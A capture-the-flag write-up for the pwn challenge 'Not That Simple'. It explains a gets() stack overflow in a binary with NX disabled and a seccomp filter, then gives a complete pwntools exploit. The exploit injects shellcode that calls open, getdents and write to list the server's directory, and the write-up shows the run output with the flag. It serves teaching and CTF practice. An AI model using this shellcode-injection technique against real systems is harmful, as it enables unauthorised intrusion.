---
grand_parent: Categories
parent: Pwn
title: Not That Simple
nav_order: 1
---

# Not That Simple
```
You didn't think it would be that easy... right?

NOTE: The flag is a filename in the current working directory of the server. See the docker for reference.
```

## Challenge
> TL;DR: Shellcode injection

From `checksec`, we know that NX is disabled. So, we can perform shellcode injection.

Ghidra's decompiled main()
``` c
undefined8 main(void)

{
  char local_58 [80];
  
  install_seccomp();
  printf("Oops, I\'m leaking! %p\n",local_58);
  puts(&DAT_00402050);
  printf("> ");
  fflush(stdout);
  gets(local_58);
  puts("Hah! You didn\'t seriously think it was that simple?");
  return 0;
}
```

After performing static analysis, we found that the binary is vulnerable to buffer overflow:
```
gets(local_58);
```

Interesting, we notice that the binary uses seccomp. Seccomp restricts what syscalls we can use.

``` bash
$ seccomp-tools dump ./notsimple 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013
 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013
 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013
 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

So, we cannot run `execve`, `execveat`, `openat`, `close`, `creat`, `uselib`, `fork` and `vfork` syscalls.

From `setup.sh` file, we know that the flag is the filename:
``` bash
#!/bin/sh
service xinetd start
cd /pwn
touch FILE_6768585 FILE_5786754 FILE_76498904 FILE_6784577 FILE_eb94e79028 FILE_6758838 redpwn_absorption_plan.txt FILE_1d4a95be0c340478af4141d1658ddd9a304e0bbdf7402526f3fb6306b261309f8ff1183a907ca57d73fa662f8d52b2dea7986a7a195c2ae962c07d77dd8f684e7f9e5fe3ac575aafeaea1b09436ea3217d143e37584fc1d2a1e085535736fb81329fb093 rarctf{f4k3_l0c4l_fl4g}
sleep infinity
```

So, we can call `getdents` syscall to list the files in the directory.

Idea of exploit: Spray the buffer and overwrite the ret address to point to the shellcode. The shellcode calls `getdents` syscall which lists files in the directory.

In our case, we placed the shellcode after the ret address.

The shellcode first calls `open('.', 0, 0)` (Syscall no. 2 is `open`). The syscall returns a file descriptor (fd) which can be used in `getdents()`. Then, the shellcode calls `getdents(fd, esp, 0x3210)` (Syscall no. 78 is `getdents`). So, it reads the directory (pointed by fd) and stores it into a buffer of size 0x3210. On success, the syscall returns the number of bytes read. Lastly, the shellcode calls `write(1, rsp, <no. of bytes read>)` (Syscall no. 1 is `write`). This syscall prints the content stored in the buffer to stdout.

Working POC:
``` python
from pwn import *

# badchars: \x0a
getdents = asm('''
    xor rax, rax
	push rax
	push 0x2E

	mov al, 2      
	mov rdi, rsp   
	xor rsi, rsi 
	xor rdx, rdx 
	syscall	

	mov rdi,rax 		
	xor rdx,rdx
	xor rax,rax
	mov dx, 0x3210 	
	sub rsp, rdx 	
	mov rsi, rsp 	
	mov al, 78 	
	syscall

	xchg rax,rdx

	xor rax, rax
	xor rdi,rdi
	
	inc eax
	inc edi
	mov rsi, rsp
	syscall
''', arch='amd64')

#r = process('./notsimple')
#pause()
r = remote('193.57.159.27', 46343)
r.recvuntil(b'leaking! ')
arr_addr = int(r.recvuntil(b'\n').strip(), 0)
print(hex(arr_addr))
r.recvuntil(b'> ')
payload = b'A' * 80
payload += b'A' * 8
payload += p64(arr_addr + 80 + 8 + 8)
payload += getdents
r.sendline(payload)
r.interactive()
```

Output of the script:
``` bash
$ python3 pwn3.py 
[+] Opening connection to 193.57.159.27 on port 46343: Done
0x7fff1b2f5d90
[*] Switching to interactive mode
[+] Opening connection to 193.57.159.27 on port 46343: Done
0x7fff1b2f5d90
[*] Switching to interactive mode
\x1b\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04    
\x04\x00\x00\x00\x00\x00\x00\x00.\x00\x00\xb6r\x0e\x00\x00\x03\x00\x00\x00 \x00ILE_6768585\x00\xb8r\x0e\x00\x00\x04\x00\x00\x00 \x00ILE_5786754\x00\xb9r\x0e\x00\x00\x05\x00\x00\x00(\x00ILE_76498904\x00\x00\x00\x0\xbar\x0e\x00\x00\x06\x00\x00\x00 \x00ILE_6784577\x00\xbbr\x0e\x00\x00\x07\x00\x00\x00(\x00ILE_eb94e79028\x00\x00\x0\xbcr\x0e\x00\x0\x00\x00\x00\x00\x00ILE_6758838\x00\xbdr\x0e\x00\x00    \x00\x00\x00\x00\x00edpwn_absorption_plan.txt\x00\x00\xber\x0e\x00\x00
\x00\x00\x00\x00\x00ILE_1d4a95be0c340478af4141d1658ddd9a304e0bbdf7402526f3fb6306b261309f8ff1183a907ca57d73fa662f8d52b2dea7986a7a195c2ae962c07d77dd8f684e7f9e5fe3ac575aafeaea1b09436ea3217d143e37584fc1d2a1e085535736fb81329fb093\x00\x00\x00\x0\xbfr\x0e\x00\x00\x0b\x00\x00\x00X\x00arctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}\x0\x1c    \x00\x00\x00\x00\x00\x00\x00\x00otsimple\x00\x0Segmentation fault
```

Flag: `rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}`

# Resources
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

https://github.com/t00sh/assembly/blob/master/shellcodes/linux/x86-64/ls_syscall.asm